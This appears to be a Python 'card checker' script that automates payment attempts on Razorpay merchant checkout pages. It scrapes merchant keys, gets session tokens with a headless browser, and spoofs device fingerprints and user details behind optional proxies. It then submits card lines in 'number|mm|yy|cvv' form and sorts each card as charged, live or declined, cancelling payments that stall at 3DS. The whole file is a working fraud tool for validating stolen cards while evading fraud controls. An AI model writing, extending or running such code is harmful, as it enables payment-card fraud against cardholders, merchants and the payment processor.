import requests, json, time, random, re, os, string
from urllib.parse import urlencode, urlparse, parse_qs
from playwright.sync_api import sync_playwright

REQUESTS_PROXY = None
PLAYWRIGHT_PROXY = None

def generate_device_fingerprint():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(128))

DEVICE_FINGERPRINT = generate_device_fingerprint()

def setup_proxy(proxy_string):
    if not proxy_string or proxy_string.strip() == "":
        return None, None
    try:
        parts = proxy_string.strip().split(':')
        if len(parts) == 4:
            ip, port, user, pw = [p.strip() for p in parts]
            req = {'http': f'http://{user}:{pw}@{ip}:{port}', 'https': f'http://{user}:{pw}@{ip}:{port}'}
            pw = {"server": f"http://{ip}:{port}", "username": user, "password": pw}
            return req, pw
        elif len(parts) == 2:
            ip, port = parts
            req = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
            return req, {"server": f"http://{ip}:{port}"}
        return None, None
    except:
        return None, None

def get_dynamic_session_token():
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if os.name != 'nt' else []
            browser = p.chromium.launch(headless=True, proxy=PLAYWRIGHT_PROXY, args=browser_args)
            page = browser.new_page()
            page.set_extra_http_headers({'User-Agent': 'Mozilla/5.0 ...'})
            page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
            browser.close()
            return (token, None) if token else (None, "Token not found")
    except Exception as e:
        return None, f"Session token error: {str(e)[:100]}"

def extract_from_payment_link(merchant_handle):
    try:
        session = requests.Session()
        if REQUESTS_PROXY: session.proxies.update(REQUESTS_PROXY)
        resp = session.get(f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}", headers={'User-Agent': 'Mozilla/5.0 ...'}, timeout=15)
        if resp.status_code != 200: return None, None, None, None, f"API returned {resp.status_code}"
        data = resp.json()
        kh = data.get('keyless_header'); kid = data.get('key_id'); plid = data.get('id')
        ppi = data.get('payment_page_items', [{}])[0].get('id')
        if all([kh, kid, plid, ppi]): return kh, kid, plid, ppi, None
        return None, None, None, None, "Missing fields in API response"
    except Exception as e:
        return None, None, None, None, f"API error: {str(e)[:100]}"

def extract_from_payment_page(page_url):
    try:
        session = requests.Session()
        if REQUESTS_PROXY: session.proxies.update(REQUESTS_PROXY)
        resp = session.get(page_url, headers={'User-Agent': 'Mozilla/5.0 ...'}, timeout=30)
        if resp.status_code != 200: return None, None, None, None, f"Page returned {resp.status_code}"
        start_marker = '// <<<JSON_DATA_START>>>'; end_marker = '// <<<JSON_DATA_END>>>'
        if start_marker in resp.text and end_marker in resp.text:
            start = resp.text.find(start_marker) + len(start_marker)
            end = resp.text.find(end_marker, start)
            json_block = resp.text[start:end].strip()
            json_start = json_block.find('{'); json_end = json_block.rfind('}') + 1
            data_str = json_block[json_start:json_end] if json_start != -1 and json_end > json_start else None
        else:
            match = re.search(r'(\{[^{}]*"keyless_header"[^{}]*\})', resp.text)
            data_str = match.group(1) if match else None
        if not data_str: return None, None, None, None, "Could not find checkout data"
        data = json.loads(data_str)
        kh = data.get('keyless_header'); kid = data.get('key_id')
        pl = data.get('payment_link', {}); plid = pl.get('id') if isinstance(pl, dict) else data.get('payment_link_id')
        ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else data.get('payment_page_items', [])
        ppi = ppi_list[0].get('id') if ppi_list else None
        if all([kh, kid, plid, ppi]): return kh, kid, plid, ppi, None
        return None, None, None, None, "Missing fields in page data"
    except Exception as e:
        return None, None, None, None, f"Page extraction error: {str(e)[:100]}"

def extract_merchant_data(site_url):
    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
    if merchant_match: return extract_from_payment_link(merchant_match.group(1))
    if 'pages.razorpay.com' in site_url: return extract_from_payment_page(site_url)
    handle_match = re.search(r'/([^/?]+)$', site_url)
    if handle_match:
        kh, kid, plid, ppi, err = extract_from_payment_link(handle_match.group(1))
        if not err: return kh, kid, plid, ppi, None
        return extract_from_payment_page(site_url)
    return None, None, None, None, "Could not determine URL type"

def random_user_info():
    return {"name": "Test User", "email": f"testuser{random.randint(100,999)}@gmail.com", "phone": f"9876543{random.randint(100,999)}"}

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15); resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except: return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    data = {
        "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id,
        "contact": f"+91{user_info['phone']}", "email": user_info["email"], "currency": "INR",
        "_[library]": "checkoutjs", "_[platform]": "browser", "_[referer]": site_url,
        "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT,
        "method": "card", "card[number]": card_number, "card[cvv]": cvv,
        "card[name]": user_info["name"], "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year, "save": "0"
    }
    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)

def check_payment_status(payment_id, key_id, session_token, keyless_header):
    headers = {'Accept': '*/*', 'x-session-token': session_token, 'User-Agent': '...'}
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}', params=params, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json(); return data.get('status', 'unknown'), data
        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
    except Exception as e:
        return 'unknown', {'error': f'Status check error: {e}'}

def cancel_payment(payment_id, key_id, session_token, keyless_header):
    headers = {'Accept': '*/*', 'x-session-token': session_token, 'Content-type': 'application/x-www-form-urlencoded'}
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel', params=params, headers=headers, timeout=15)
        try: return r.json()
        except json.JSONDecodeError: return {"error": {"description": f"Cancel HTTP {r.status_code}: {r.text[:200]}"}}
    except Exception as e: return {"error": {"description": f"Cancel request error: {e}"}}

def parse_decline_reason(cancel_data):
    if isinstance(cancel_data, dict) and "error" in cancel_data:
        err = cancel_data["error"]
        if isinstance(err, dict):
            desc = err.get('description', 'Declined').replace("%s", "Card")
            reason = err.get('reason', ''); code = err.get('code', '')
            parts = [desc]
            if reason and reason != 'unknown': parts.append(f"Reason: {reason}")
            if code and code != 'N/A': parts.append(f"Code: {code}")
            return " | ".join(parts)
        return str(err)
    return json.dumps(cancel_data)[:100] if cancel_data else "Unknown decline reason"

def process_card(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise):
    start = time.time()
    try: num, mm, yy, cvv = cc_line.strip().split('|')
    except ValueError: return "SKIP", "Invalid format", 0, {}
    session = requests.Session()
    if REQUESTS_PROXY: session.proxies.update(REQUESTS_PROXY)
    order_id = create_order(session, plid, amount_paise, ppiid)
    if not order_id: return "FAIL", "Order creation failed", round(time.time()-start,2), {}
    time.sleep(random.uniform(1,2))
    try:
        user_info = random_user_info()
        response = submit_payment(session, order_id, (num,mm,yy,cvv), user_info, amount_paise, kid, kh, plid, stoken, site_url)
        pdata = response.json()
    except Exception as e: return "ERROR", f"Payment submission failed: {str(e)[:60]}", round(time.time()-start,2), {}
    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
    if not pid and isinstance(pdata.get("payment"), dict): pid = pdata["payment"].get("id")
    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
        if pid:
            time.sleep(3)
            stat, sdata = check_payment_status(pid, kid, stoken, kh)
            if stat in ['captured','authorized']: return "CHARGED", f"ID: {pid} | Status: {stat}", round(time.time()-start,2), pdata
            if stat == 'failed':
                reason = "Payment failed"
                if isinstance(sdata, dict): err = sdata.get('error_description') or sdata.get('error',{}).get('description',''); reason = err or reason
                return "DECLINED", f"ID: {pid} | {reason}", round(time.time()-start,2), pdata
            if stat == 'created': return "LIVE", f"ID: {pid} | 3DS/OTP Required", round(time.time()-start,2), pdata
            cdata = cancel_payment(pid, kid, stoken, kh)
            if isinstance(cdata, dict) and "error" in cdata:
                err = cdata["error"]
                if isinstance(err, dict):
                    reason_code = err.get('reason',''); desc = err.get('description','')
                    if reason_code == 'payment_cancelled': return "LIVE", f"ID: {pid} | 3DS/OTP Required", round(time.time()-start,2), pdata
                    else: return "DECLINED", f"ID: {pid} | {desc}", round(time.time()-start,2), pdata
            return "DECLINED", f"ID: {pid} | {parse_decline_reason(cdata)}", round(time.time()-start,2), pdata
        return "FAIL", f"3DS redirect missing URL (pid={pid})", round(time.time()-start,2), pdata
    if "razorpay_signature" in pdata or "signature" in pdata: return "CHARGED", f"ID: {pid} | Immediate success", round(time.time()-start,2), pdata
    if "error" in pdata:
        err = pdata.get('error',{})
        if isinstance(err, dict):
            desc = err.get('description','Unknown error').replace("%s","Card"); code = err.get('code','N/A'); reason = err.get('reason','')
            msg = f"{desc} (Code: {code})"
            if reason: msg += f" [Reason: {reason}]"
            if pid: msg = f"ID: {pid} | {msg}"
            return "DECLINED", msg, round(time.time()-start,2), pdata
        return "DECLINED", f"Error: {json.dumps(err)[:80]}", round(time.time()-start,2), pdata
    return "UNKNOWN", f"Response: {json.dumps(pdata)[:100]}", round(time.time()-start,2), pdata
